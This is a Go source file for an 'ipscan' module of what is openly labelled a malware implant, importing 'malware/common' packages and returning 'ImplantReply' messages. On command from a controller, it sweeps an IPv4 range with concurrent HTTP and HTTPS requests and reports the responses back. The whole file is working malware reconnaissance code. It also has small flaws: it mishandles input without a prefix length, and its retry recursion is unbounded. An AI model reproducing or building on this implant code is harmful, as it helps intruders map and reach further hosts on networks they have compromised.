package ip_scan

import (
	"context"
	"fmt"
	"golang.org/x/sync/semaphore"
	"io/ioutil"
	"malware/common/messages"
	"malware/common/types"
	"math"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

type state struct {
	running  bool
	scanning bool
	lock     *semaphore.Weighted
}

type settings struct {
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false, scanning: false, lock: semaphore.NewWeighted(100)}
	return settings{&state}
}

func Scan(target string, timeout time.Duration) string {
	resp, err := http.Get(target)

	if err != nil {
		if strings.Contains(err.Error(), "too many open files") {
			time.Sleep(timeout)
			return Scan(target, timeout)
		}
		return ""
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	fmt.Printf("%s: %+v -> %s\n", target, resp.TLS, string(body))
	return string(body)
}

// Call from 24 -> 32
func ip_range(ip string) (string, int) {
	parts := strings.Split(ip, "/")
	if len(parts) > 2 {
		return "", -1
	}

	bits, err := strconv.Atoi(parts[1])
	if err != nil || bits < 24 || bits > 32 {
		return "", -1
	}

	if net.ParseIP(parts[0]) == nil {
		return "", -1
	}

	if net.ParseIP(parts[0]).To4() == nil {
		return "", -1 // Only ipv4
	}
	ip_trimmed := strings.TrimSpace(parts[0])
	ip_parts := strings.Split(ip_trimmed, ".")

	return ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + ".", int(math.Pow(float64(2), float64(32-bits)))
}

func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*messages.ImplantReply)) {
	if ipscan.Cancel {
		settings.state.scanning = false
	} else if settings.state.scanning {
		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_IPSCAN_RUNNING})
	} else {
		settings.state.scanning = true

		wg := sync.WaitGroup{}
		ip, bits := ip_range(ipscan.IpRange)
		if bits == -1 {
			callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_INVALID_RANGE_IPSCAN})
			return
		}

		for start := 0; start < bits; start++ {
			ip := ip + strconv.Itoa(start)
			settings.state.lock.Acquire(context.TODO(), 1)
			wg.Add(1)

			go func(ip string) {
				defer settings.state.lock.Release(1)
				defer wg.Done()
				Scan("http://"+ip, time.Second/4)
				Scan("https://"+ip, time.Second/4)
			}(ip)
		}

		wg.Wait()

		settings.state.scanning = false
		callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_COMPLETE}})
	}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
	ipscan := message.GetIpScan()
	if ipscan == nil {
		return false
	}

	go settings.ip_scan(ipscan, callback)
	return true
}

// Init the state of this module
func (settings settings) Init() {
	settings.state.running = true
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "ipscan" }
